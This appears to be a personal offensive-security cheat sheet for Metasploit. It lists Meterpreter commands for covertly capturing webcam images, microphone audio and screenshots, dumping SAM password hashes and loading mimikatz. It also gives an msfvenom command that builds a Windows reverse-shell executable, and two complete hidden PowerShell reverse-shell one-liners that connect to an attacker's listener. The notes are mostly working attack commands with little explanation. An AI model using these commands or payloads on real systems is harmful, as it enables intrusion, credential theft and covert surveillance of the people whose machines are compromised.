			Meterpreter
### Webcam
- `record_mic`     Record audio from the default microphone for X seconds
- `webcam_chat`    Start a video chat
- `webcam_list`    List webcams
- `webcam_snap`    Take a snapshot from the specified webcam
- `webcam_stream`  Play a video stream from the specified webcam

### Misc

- `hashdump` will retrieve all hashed frm sam file
- `load kiwi` will in let us use mimikatz
- `screenshot` Grab a screenshot of the interactive desktop
- `shell`  get a shell on remote machine

# MSFvenoim
WINDOWS reverse shell
- get ip `ip a`
- `msfvenom -p windows/shell_reverse_tcp lhost=$IP lport=443 -f exe > shell.exe`
- `nc -lvnp 443`


# Netcat shell to Meterpreter
- `use multi/handler`
- 


powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.224",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.2",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/